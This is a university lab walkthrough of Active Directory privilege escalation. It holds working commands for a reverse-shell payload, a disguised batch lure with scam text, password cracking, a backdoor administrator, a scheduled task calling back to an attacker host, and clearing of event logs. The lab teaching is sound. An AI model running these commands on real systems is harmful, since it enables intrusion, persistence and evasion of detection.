
# ACL-Based Privilege Escalation Walkthrough

In this guide we will focus on how to discover weak security, exploiting weak security and create an attack script for privilege escalation, particularly focusing on Windows Active Directory (AD) systems.

## Prerequisites

First of all we will use the gns3 platform made available on the cyber.unitbv.ro website for the students of the Transylvania University of Brasov. From there we can use the following systems for our laboratory:

| Hostname                     | VNC Access URL                             | IPv4 Address | Gateway     | Role              |
|-----------------------------|--------------------------------------------|--------------|-------------|-------------------|
| WS2008-Client-DomainJoined  | [VNC](vnc://gns3server3.unitbv.ro:8711)    | 10.80.0.11   | 10.80.0.1   | Domain Client     |
| WS2008-Client-Workgroup     | [VNC](vnc://gns3server3.unitbv.ro:8714)    | 10.80.0.10   | 10.80.0.1   | Workgroup Client  |
| WS2008-DomainController     | [VNC](vnc://gns3server3.unitbv.ro:8712)    | 10.80.0.2    | 10.80.0.1   | Domain Controller |
| Kali                        | [VNC](vnc://gns3server3.unitbv.ro:8722)    | 10.80.0.17   | 10.80.0.1   | Attacker/Kali     |

Make sure that the systems are on, the assigned addresses are correct. You can also check the AD users present in WS2008-DomainController. We will use some steps from the cyber kill chain model for this laboratory. The cyber kill chain is the process by which perpetrators carry out cyberattacks. It will be slightly modified. Throughout these steps I will also attach some screenshots as an example of what output we should have for the exercises.

From WS2008-DomainController, as the Administrator user, we can run the `Get-ADUser -Filter * | Select-Object -ExpandProperty DistinguishedName` to list all users with DNs.

![ad list](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img2.jpeg)

Be aware of them as we need them later on.

## Attack phases

We can break the process into a few phases: discovery, exploitation, and privilege escalation for example. Feel free to experiment yourself as well.

![cat text](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExaW1vajcybXQxcmhoZHExOXJ6aGU0ZnQ5dm1yanVpMTM2NzFlMjJ0eiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/maNB0qAiRVAty/giphy.gif "Cat typing")

### Reconnaissance

Gather information about the network and identify objects in Active Directory, user rights, and security settings. This can be done by scanning the network for open ports, identifying services, and extracting information on AD objects.

As seen in the [Prerequisistes](#Prerequisistes) chapter we already know some things about our network, the IP addresses, AD users. In a real case scenario, like production, this process would be much more comprehensive.

This can be done remotely as well if the attacker has access to the system. Windows Server 2008 is outdated already and can be easly exploited. In this sense let's analyze using `nmap` the ports of interest that could help us for the attack. We will run the following command on our Kali machine:

```bash
nmap -p 445,139,3389 10.80.0.0/24
```

This will help you identify which systems are running file-sharing services (445/139) and RDP (3389), which may be useful for exploitation.

Once you know that a domain controller is available, you can query the domain to get information on users, groups, and permissions. If you don't know what all that mean do a little research on [Active Directory](https://en.wikipedia.org/wiki/Active_Directory) on logical structure. For example:

```bash
ldapsearch -x -H ldap://10.80.0.2 -D "CN=jack,OU=LabUsers,DC=GISC,DC=lab" -w 'secret' -b "DC=GISC,DC=lab"
```

Or:

```bash
ldapsearch -x -H ldap://10.80.0.2 -D "CN=Administrator,CN=Users,DC=GISC,DC=lab" -w 'secret' -b "DC=GISC,DC=lab"
```

It will probably return an error because of the wrong passwords. You can request them from teachers to test it for now. For Administrator you should be able to know the _secret_. It is the credential you use for logging in the session for Windows.

A good example:

![ldapsearch good](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img5.jpeg)

You can also use `get-acl` and `dsacls` to check the security descriptors and permissions on AD objects. These tools can show which users or groups have specific rights to change attributes or even escalate privileges.

But how to obtain the password and the user? What are the next steps?

### Weaponization

Let's talk a bit about human vulnerabilities in the context of cybersecurtiy.

#### Phishing attacks

Phishing exploits human psychology, curiosity, urgency, fear to trick individuals into revealing sensitive information, clicking malicious links, or executing harmful files. Even with strong firewalls and advanced detection systems, a single user clicking on a cleverly crafted email can compromise an entire network.

#### Creating a simple reverse shell

As in a real case we don't have at this moment an interactive GUI or shell access on the Windows Server.Even if today people are more aware than before on suspect mails, we will create a simple reverse shell to run commands remotely to the Windows Server system.

As we checked previously the SMB port is opened. We can exploit vulnerabilities in the SMB protocol to execute malicious code.

We generate a custom payload to open a reverse shell to the Windows machine. [Msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) is the combination of payload generation and encoding. It replaced msfpayload and msfencode on June 8th 2015. It is a great tool for generating shellcode quickly, with both encryption and/or encoding options available to help prevent AV detection.

We are going to use the `shell_reverse_tcp` payload for the x64 architecture opened on port 4444. It will output a file called `reverse.exe` which will be executed at any moment by a user, given that he is not aware of the consequences.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.80.0.17 LPORT=4444 -f exe -o reverse.exe
```

![msfvenom](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img6.jpeg)

Then we are going to host it and deliver it via SMB share, phishing, RCE exploit:

```bash
sudo impacket-smbserver share $(pwd)
```

![smb server](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img7.jpeg)

Note: use another path if your executable file is not located in the working directory.

The next step is to use netcat to wait and catch the shell when the delivered script is executed:

```bash
nc -lvnp 4444
```

![listening](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img9.jpeg)

Next we are going to discuss how to deliver.

### Delivery

Intruder transmits weapon to target (e.g., via e-mail attachments, websites or USB drives).

Through email or various methods we can either use a PDF file that contains the malicious link to that server containing the executable file or to place a good looking batch script on the target computer. 

For that we created a shortcut to a batch file placed on the Desktop of the Windows machine called `DOUBLE CLICK TO TAKE YOUR PRIZE`. Once executed, it will first silently run the executable file remotely opening the shell on the Kali machine. Here is the script used:

```batch
@echo off

:: Step 1 – Run EXE from network share
start "" "\\10.80.0.X\share\reverse.exe"

:: Step 2 – Show prank message
title YOU HAVE JUST WON AN IPHONE XS MAX 512GB!!!
echo.
echo YOU HAVE JUST WON AN IPHONE XS MAX 512GB!!!
echo Dear valued customer,
echo You have just won the iPhone XS Max Space Gray 512GB!!!
echo To claim the prize please send your credit card number, the expiration date and the three numbers on the back.
echo iPhone will arrive in post, please email back your address.
echo You have just won an AirPods!!!
echo To claim the prize please send your credit card number, the expiration date and the three numbers on the back.
echo Airpod will arrive in post, please email back your address.
echo From Sandesh Kumar, Apple CEO India operative.
echo.

pause
exit
```

When executed it looks like that:

![congrats](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img12.jpeg)

Running `dascls` as an example:

![dsacls](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img10.jpeg)

After closing the session the `reverse.exe` process will crash, but it doesn't matter as we already finished our job.

![crash](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img8.jpeg)

It may look pretty shady, but it is useful and a good example for our case. Again, feel free to explore other ways of how to gain remote command execution using tools like `evil-winrm` or `crackmapexec`.

### Exploitation, command and control, privilege escalation

For demonstration purposes we are going to use a `.bat` script, as well as a `.ps1` script for our ACL-Based Privilege Escalation. The scripts will create a backdoor user used for malicious purposes. The scripts also contain commands like adding the backdoor user to an group of interest like Finance. Attached there will be other commands as well. Code will run again from our already made smb server.

We will analyze user _jack_ that has administrative roles, how to exploit that roles, how to create a scheduled task for persistence and later how to do a cleanup to remove your traces.

![query user on jack](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img11.jpeg)

We can check the roles using the command we used at the beginning to list all users with DNs.

#### Cracking the password for user jack, grant rights

If you have access to any Windows machine where jack or another user logged in, you can try to dump password hashes and crack them using `hashcat`.

To obtain the hashes you can use `secretsdump.py` from the Impacket collection of tools. Command attached in the image.

![hashes](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img4.jpeg)

After getting the hashes you can save them in a file called `hashes.txt` and use the following command:

```bash
hashcat -m 1000 hashes.txt rockyou.txt
```

For this laboratory we used `crackmapexec` directly with the `rockyou.txt` dictionary of passwords to obtain jack's password. The dictionary can be found online.

```bash
crackmapexec smb 10.80.0.2 -u jack -P /usr/share/wordlists/rockyou.txt
```

![crack password](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img1.jpeg)

You obtained the password! Now you can use it to your advantage.

In the reverse shell:

```bash
dsacls "CN=Administrator,CN=Users,DC=GISC,DC=lab" /G "jack:CA"
```

You granted the user jack the control access right (that jack:CA) on the Administrator account object in Active Directory.

#### Using Administrator with the proposed scripts and further commands

Let's create a script that creates a backdoor admin account using batch. The following code should be saved as a `.bat` file:

```batch
@echo off
:: Create new admin user
net user backdooradmin S3cur3P@ssw0rd /add

:: Add to Administrators group
net localgroup Administrators backdooradmin /add
```

![create admin](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img14.jpeg)

Verify admin user was created:

```powershell
net user backdooradmin
```

![verify admin](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img15.jpeg)

Now using a powershell script saved as `.ps1`:

```powershell
# Add to Finance
Add-ADGroupMember -Identity "Finance" -Members "backdooradmin"
Get-ADGroupMember -Identity "Finance"
```

This adds user `backdooradmin` to `Finance` global security group in domain `GISClab`.

![add to finance](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img17.jpeg)

#### Scheduled task for persistence

A method for persistence is creating a scheduled task that will open the backdoor shell each time the system reboots:

```powershell
schtasks /create /tn "PersistenceTask" /tr "powershell.exe -Command (New-Object Net.Sockets.TCPClient('attacker_ip', 4444)).GetStream()" /sc onlogon /ru SYSTEM
```

### Cleanup

The following script will clear all the events since the beginning. 

```powershell
Clear-EventLog -LogName Security
Clear-EventLog -LogName System
Clear-EventLog -LogName Application
```

Note: If there in the topology of the network a pfsense is attached that specific system will raise an alarm of this incident. The system will also announce about any [Scheduled tasks for persistence](#Scheduled) that take place.

